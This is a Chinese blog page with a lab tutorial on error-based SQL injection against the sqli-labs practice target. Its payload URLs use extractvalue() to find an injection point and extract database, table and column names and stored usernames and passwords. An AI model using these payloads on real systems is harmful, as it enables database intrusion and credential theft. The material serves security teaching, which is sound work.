@@ -1,0 +1,562 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>X8@0E的博客</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="SQL注入-基于报错的注入1基于字符型注入的基础上 实验原理（1）关于报错注入 基于报错的注入，是指通过构造特定的SQL语句，让攻击者想要查询的信息（如数据库名、版本号、用户名等）通过页面的错误提示回显出来。报错注入一般需要具备两个前提条件：（1）Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；（2）后台未对一些具有报错功能的函数进行过滤。常用的报错功能函数包括ext">
+<meta property="og:type" content="article">
+<meta property="og:title" content="X8@0E的博客">
+<meta property="og:url" content="http://example.com/2025/11/12/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="X8@0E的博客">
+<meta property="og:description" content="SQL注入-基于报错的注入1基于字符型注入的基础上 实验原理（1）关于报错注入 基于报错的注入，是指通过构造特定的SQL语句，让攻击者想要查询的信息（如数据库名、版本号、用户名等）通过页面的错误提示回显出来。报错注入一般需要具备两个前提条件：（1）Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；（2）后台未对一些具有报错功能的函数进行过滤。常用的报错功能函数包括ext">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20251112233617207.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20251112233706132.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20251112233841522.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20251112233945832.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20251112234650983.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20251112234702542.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20251112234823577.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20251112234853961.png">
+<meta property="article:published_time" content="2025-11-12T15:26:44.516Z">
+<meta property="article:modified_time" content="2025-11-12T15:50:31.131Z">
+<meta property="article:author" content="X8@0E">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20251112233617207.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1765183933892">
+
+<link rel="stylesheet" href="/css/style.css?v=1765183933892">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1765183933892">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1765183933892"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/55f0c32a6a773efe8c6a6a8158a06f18.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="X8@0E"><img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="X8@0E">
+            <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E" alt="X8@0E">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>55</div>
+        <div><span>标签</span>80</div>
+        <div><span>分类</span>18</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-douban-fill"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1765183933892"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://blog.csdn.net/2301_81325456/article/details/147025965"
+			target="_blank"
+			mdui-tooltip="{content: 'CSDN'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/NSSCTF/">NSSCTF</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnhub/">Vulnhub</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnvm靶机复现/">Vulnvm靶机复现</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-信息收集/">ctfshow-web-信息收集</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-命令执行/">ctfshow-web-命令执行</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件上传/">ctfshow-web-文件上传</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件包含/">ctfshow-web-文件包含</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-爆破/">ctfshow-web-爆破</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/sql注入/">sql注入</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulhub/">vulhub</a>
+          <span class="category-list-count">7</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulnhub/">vulnhub</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/安全工具/">安全工具</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/安全工具设备/">安全工具设备</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/春秋云镜-com/">春秋云镜.com</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/深信服/">深信服</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/群友靶机/">群友靶机</a>
+          <span class="category-list-count">15</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/自制靶机/">自制靶机</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/1Panel/" style="font-size: 10px;">1Panel</a> <a href="/tags/3%E4%B8%AA%E7%82%B9/" style="font-size: 10px;">3个点</a> <a href="/tags/ARL/" style="font-size: 10px;">ARL</a> <a href="/tags/Argon2Cracker/" style="font-size: 20px;">Argon2Cracker</a> <a href="/tags/Cookie-GLOBALS/" style="font-size: 10px;">Cookie--GLOBALS</a> <a href="/tags/Cypher%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">Cypher注入</a> <a href="/tags/DC/" style="font-size: 13.33px;">DC</a> <a href="/tags/GIF%E7%BB%95%E8%BF%87/" style="font-size: 10px;">GIF绕过</a> <a href="/tags/Jinja2/" style="font-size: 10px;">Jinja2</a> <a href="/tags/JoomScan/" style="font-size: 10px;">JoomScan</a> <a href="/tags/LFI%E5%88%B0RCE-open%E5%87%BD%E6%95%B0/" style="font-size: 10px;">LFI到RCE(open函数)</a> <a href="/tags/NSSCTF/" style="font-size: 13.33px;">NSSCTF</a> <a href="/tags/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">Nginx解析漏洞</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/RUNPATH/" style="font-size: 10px;">RUNPATH</a> <a href="/tags/Rabbit/" style="font-size: 10px;">Rabbit</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/Vulnhub/" style="font-size: 13.33px;">Vulnhub</a> <a href="/tags/Vulnvm/" style="font-size: 10px;">Vulnvm</a> <a href="/tags/WAF/" style="font-size: 10px;">WAF</a> <a href="/tags/WPA-01-cap/" style="font-size: 10px;">WPA-01.cap</a> <a href="/tags/aircrack-ng/" style="font-size: 10px;">aircrack-ng</a> <a href="/tags/basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">basic认证爆破</a> <a href="/tags/cgi%E6%96%87%E4%BB%B6/" style="font-size: 10px;">cgi文件</a> <a href="/tags/ctfshow/" style="font-size: 16.67px;">ctfshow</a> <a href="/tags/dirtycow/" style="font-size: 10px;">dirtycow</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/docker%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/" style="font-size: 10px;">docker交互式shell</a> <a href="/tags/drupal/" style="font-size: 10px;">drupal</a> <a href="/tags/ffuf/" style="font-size: 20px;">ffuf</a> <a href="/tags/flask/" style="font-size: 10px;">flask</a> <a href="/tags/fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E/" style="font-size: 10px;">fork解决断连</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/ghfs/" style="font-size: 10px;">ghfs</a> <a href="/tags/ldd/" style="font-size: 10px;">ldd</a> <a href="/tags/les-sh/" style="font-size: 10px;">les.sh</a> <a href="/tags/linpeas-sh/" style="font-size: 10px;">linpeas.sh</a> <a href="/tags/lsattr-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7/" style="font-size: 10px;">lsattr--查看文件扩展属性</a> <a href="/tags/motto/" style="font-size: 10px;">motto</a> <a href="/tags/msfvenom/" style="font-size: 13.33px;">msfvenom</a> <a href="/tags/mysql-old-password/" style="font-size: 10px;">mysql_old_password</a> <a href="/tags/nikto/" style="font-size: 10px;">nikto</a> <a href="/tags/nohup/" style="font-size: 10px;">nohup</a> <a href="/tags/openfire/" style="font-size: 10px;">openfire</a> <a href="/tags/php%E6%8F%90%E6%9D%83root/" style="font-size: 10px;">php提权root</a> <a href="/tags/poc/" style="font-size: 10px;">poc</a> <a href="/tags/put%E6%96%B9%E6%B3%95/" style="font-size: 10px;">put方法</a> <a href="/tags/python3-5/" style="font-size: 10px;">python3.5</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/readelf/" style="font-size: 10px;">readelf</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql二次注入</a> <a href="/tags/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/" style="font-size: 10px;">ssh弱口令爆破</a> <a href="/tags/ssh%E7%A7%98%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">ssh秘钥生成连接</a> <a href="/tags/stegseek/" style="font-size: 10px;">stegseek</a> <a href="/tags/suForce/" style="font-size: 10px;">suForce</a> <a href="/tags/url%E6%88%AA%E6%96%AD/" style="font-size: 10px;">url截断</a> <a href="/tags/vite/" style="font-size: 10px;">vite</a> <a href="/tags/web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">web命令执行</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">web文件上传</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">web文件包含</a> <a href="/tags/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">web源码泄露</a> <a href="/tags/web%E7%88%86%E7%A0%B4/" style="font-size: 10px;">web爆破</a> <a href="/tags/x-forwarded-for%E7%9A%84ip%E6%AC%BA%E9%AA%97/" style="font-size: 10px;">x-forwarded-for的ip欺骗</a> <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2025-30208/" style="font-size: 10px;">任意文件读取漏洞(CVE-2025-30208)</a> <a href="/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/" style="font-size: 10px;">凯撒密码</a> <a href="/tags/%E5%90%8E%E9%9D%A2%E5%8A%A0-jpg%E5%90%8E%E7%BC%80/" style="font-size: 10px;">后面加.jpg后缀</a> <a href="/tags/%E5%9F%9F%E6%8E%A7/" style="font-size: 10px;">域控</a> <a href="/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">密码爆破</a> <a href="/tags/%E6%8F%90%E6%9D%83-env-reset/" style="font-size: 10px;">提权!env_reset</a> <a href="/tags/%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">插件漏洞</a> <a href="/tags/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-ua%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">日志注入+ua添加木马</a> <a href="/tags/%E6%AD%A3%E5%90%91shell/" style="font-size: 10px;">正向shell</a> <a href="/tags/%E7%8A%B6%E6%80%81%E7%A0%81/" style="font-size: 10px;">状态码</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" style="font-size: 10px;">环境变量</a> <a href="/tags/%E7%A9%BA%E6%A0%BC/" style="font-size: 10px;">空格</a> <a href="/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/" style="font-size: 10px;">维吉尼亚密码</a> <a href="/tags/%E8%9A%81%E5%89%91/" style="font-size: 10px;">蚁剑</a> <a href="/tags/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96/" style="font-size: 10px;">越界读取</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(80);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">55</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/12/04/Xray/">Xray</a>
+          </li>
+        
+          <li>
+            <a href="/2025/12/03/ARL/">ARL--资产侦查灯塔系统</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/19/openfire/">CVE-2023-323115</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/13/SQL%E6%B3%A8%E5%85%A5-SQLMAP%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/13/SQL%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="" target="_blank" >
+                    <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></img>
+                    <p>X8@0E</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2025 X8@0E
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/55f0c32a6a773efe8c6a6a8158a06f18.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080" alt="" loading="lazy">
+            <h1></h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2025年11月12日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="SQL注入-基于报错的注入1"><a href="#SQL注入-基于报错的注入1" class="headerlink" title="SQL注入-基于报错的注入1"></a>SQL注入-基于报错的注入1</h1><p>基于字符型注入的基础上</p>
+<h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>（1）关于报错注入</p>
+<p>基于报错的注入，是指通过构造特定的SQL语句，让攻击者想要查询的信息（如数据库名、版本号、用户名等）通过页面的错误提示回显出来。<br>报错注入一般需要具备两个前提条件：（1）Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；（2）后台未对一些具有报错功能的函数进行过滤。<br>常用的报错功能函数包括extractvalue()、updatexml()、floor()、exp()等。</p>
+<p>（2）关于extractvalue()函数</p>
+<p>作用：对XML文档进行查询，相当于在HTML文件中用标签查找元素。<br>语法：extractvalue(XML_document, XPath_string)<br>参数1：XML_document是String格式，为XML文档对象的名称；<br>参数2：XPath_string(Xpath格式的字符串)，注入时可操作的地方。<br>报错原理：xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果写入其他格式就会报错，并且会返回写入的非法格式内容，错误信息如：XPATH syntax error:’xxxxxxxx’。</p>
+<p>登录后，根据网页提示，先给定一个GET参数，即：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1</span><br></pre></td></tr></table></figure>
+
+<p>此时页面显示id&#x3D;1的用户名Dump、密码Dump。</p>
+<h4 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h4><p>分别使用以下3条payload寻找注入点及判断注入点的类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>运行后报错！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>运行后正常显示！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>
+
+<p>运行后未正常显示！</p>
+<h4 id="由上述结果可以判断，网站存在字符型注入点。"><a href="#由上述结果可以判断，网站存在字符型注入点。" class="headerlink" title="由上述结果可以判断，网站存在字符型注入点。"></a>由上述结果可以判断，网站存在字符型注入点。</h4><h4 id="获取网站当前所在数据库的库名"><a href="#获取网站当前所在数据库的库名" class="headerlink" title="获取网站当前所在数据库的库名"></a>获取网站当前所在数据库的库名</h4><p>使用以下payload获取网站当前所在数据库的库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database()))--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果为security。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112233617207.png" alt="image-20251112233617207" data-caption="image-20251112233617207" loading="lazy"></p>
+<h4 id="获取数据库security的全部表名"><a href="#获取数据库security的全部表名" class="headerlink" title="获取数据库security的全部表名"></a>获取数据库security的全部表名</h4><p>使用以下payload获取数据库security的全部表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112233706132.png" alt="image-20251112233706132" data-caption="image-20251112233706132" loading="lazy"></p>
+<p>注意：extractvalue() 函数所能显示的错误信息最大长度为32，如果错误信息超过了最大长度，有可能导致显示不全。因此，有时需要借助limit来做分行显示，上述payload可以改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)))--+</span><br><span class="line">//显示security库中的第1张表的名字</span><br><span class="line"></span><br><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1)))--+</span><br><span class="line">//显示security库中的第2张表的名字</span><br><span class="line"></span><br><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1)))--+</span><br><span class="line">//显示security库中的第3张表的名字</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取users表的全部字段名"><a href="#获取users表的全部字段名" class="headerlink" title="获取users表的全部字段名"></a>获取users表的全部字段名</h4><p>使用以下payload获取users表的全部字段名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)))--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果，users表中有id、username和password三个字段。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112233841522.png" alt="image-20251112233841522" data-caption="image-20251112233841522" loading="lazy"></p>
+<p>同上一个步骤相似，为了避免错误信息太长导致显示不全，有时需要借助limit来做分行显示，上述payload可以改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1)))--+</span><br><span class="line">//显示users表中的第1个字段的名字</span><br><span class="line"></span><br><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 1,1)))--+</span><br><span class="line">//显示users表中的第2个字段的名字</span><br><span class="line"></span><br><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 2,1)))--+</span><br><span class="line">//显示users表中的第3个字段的名字</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取users表id、username和password字段的全部值。"><a href="#获取users表id、username和password字段的全部值。" class="headerlink" title="获取users表id、username和password字段的全部值。"></a>获取users表id、username和password字段的全部值。</h4><p>由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如</p>
+<p>（1）显示第1组数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1)))--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果为Dump，Dump。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112233945832.png" alt="image-20251112233945832" data-caption="image-20251112233945832" loading="lazy"></p>
+<p>以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。<br>实验至此结束。</p>
